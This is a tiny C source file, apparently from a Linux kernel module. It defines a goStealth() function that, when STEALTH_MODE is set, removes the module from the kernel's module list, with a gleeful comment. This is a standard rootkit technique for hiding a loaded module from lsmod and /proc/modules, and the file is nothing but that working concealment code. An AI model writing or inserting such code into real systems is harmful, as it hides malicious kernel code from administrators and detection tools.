#include "stealth.h"

#ifdef STEALTH_MODE
void goStealth(void)
{
    list_del(&THIS_MODULE->list); //Poof! ]:->
}
#endif //STEALTH_MODE